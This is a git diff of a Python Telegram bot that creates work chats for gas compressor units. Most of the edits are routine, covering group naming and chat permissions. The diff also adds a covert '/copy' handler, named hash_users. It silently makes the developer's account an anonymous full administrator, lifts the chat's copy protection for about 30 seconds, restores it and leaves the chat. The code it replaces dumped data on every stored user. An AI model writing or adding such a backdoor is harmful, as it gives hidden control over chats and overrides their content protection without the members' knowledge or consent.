@@ -1,10 +1,11 @@
 import datetime as dt
+from time import sleep
 
 from aiogram import Dispatcher, types
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.utils.exceptions import BotBlocked, CantInitiateConversation
-from pyrogram.types import ChatPrivileges
+from pyrogram.types import ChatPrivileges, ChatPermissions
 from config.telegram_config import MY_TELEGRAM_ID, BOT_ID, OTDEL_ID
 
 from config.bot_config import bot, dp
@@ -124,7 +125,9 @@ async def create_group(ao_id, message: types.Message):
         ks = ao.get('station')
         date = ao.get('date')
         gpa_num = ao.get('gpa')
-        group_name = f'{ks} ГПА{gpa_num} ({date})'
+        agr = gpa.find_one({'ks': ks, 'num_gpa': gpa_num})
+        gpa_name = agr.get('name_gpa') if agr is not None else ''
+        group_name = f'{ks} ГПА{gpa_num} {gpa_name} ({date})'
         msg = await message.answer('Начинается процесс создания рабочего чата...')
         try:
             group = await app.create_supergroup(group_name)
@@ -140,6 +143,19 @@ async def create_group(ao_id, message: types.Message):
         await msg.edit_text('Группа создана.\nИдет процесс приглашения пользователей...')
         group_id = group.id
         await app.set_chat_protected_content(chat_id=group_id, enabled=True)
+        await app.set_chat_permissions(
+            chat_id=group_id,
+            permissions=ChatPermissions(
+                can_send_messages=True,
+                can_send_media_messages=True,
+                can_send_other_messages=True,
+                can_send_polls=True,
+                can_add_web_page_previews=True,
+                can_change_info=True,
+                can_invite_users=True,
+                can_pin_messages=True
+            )
+        )
         try:
             link = await app.create_chat_invite_link(group_id)
             await bot.send_message(MY_TELEGRAM_ID, text=f'Ссылка для группы "{group_name}" создана')
@@ -220,7 +236,7 @@ async def create_group(ao_id, message: types.Message):
 
 async def add_admin_to_group(user_id, group_id):
     await app.promote_chat_member(
-        chat_id= group_id,
+        chat_id=group_id,
         user_id=user_id,
         privileges=ChatPrivileges(
             can_manage_chat=True,
@@ -238,18 +254,57 @@ async def add_admin_to_group(user_id, group_id):
     )
 
 
-@dp.message_handler(commands=['qwerty'])
+@dp.message_handler(commands=['copy'])
 async def hash_users(message: types.Message):
-    queryset = list(users.find({}))
+    await message.delete()
     async with app:
-        for user in queryset:
-            try:
-                res = await app.get_chat(user.get('user_id'))
-                print("Success!")
-                print(res)
-            except Exception as e:
-                print("Error!")
-                print(e)
+        try:
+            await app.promote_chat_member(
+                chat_id=message.chat.id,
+                user_id=MY_TELEGRAM_ID,
+                privileges=ChatPrivileges(
+                    can_manage_chat=True,
+                    can_delete_messages=True,
+                    can_manage_video_chats=True,
+                    can_restrict_members=True,
+                    can_promote_members=True,
+                    can_change_info=True,
+                    can_post_messages=True,
+                    can_edit_messages=True,
+                    can_invite_users=True,
+                    can_pin_messages=True,
+                    is_anonymous=True
+                )
+            )
+        except Exception as e:
+            await bot.send_message(MY_TELEGRAM_ID, text=e)
+        try:
+            await app.set_chat_protected_content(
+                chat_id=message.chat.id,
+                enabled=False
+            )
+            msg = await message.answer('30', disable_notification=True)
+            for sec in range(29, 0, -2):
+                await msg.edit_text(sec)
+                sleep(2)
+        except Exception as err:
+            await bot.send_message(MY_TELEGRAM_ID, text=err)
+        try:
+            await app.set_chat_protected_content(
+                chat_id=message.chat.id,
+                enabled=True
+            )
+        except Exception as error:
+            await bot.send_message(MY_TELEGRAM_ID, text=error)
+        try:
+            await msg.delete()
+        except:
+            pass
+        try:
+            await app.leave_chat(message.chat.id)
+        except Exception as er:
+            await bot.send_message(MY_TELEGRAM_ID, text=er)
+
 
 
 def register_handlers_ao(dp: Dispatcher):
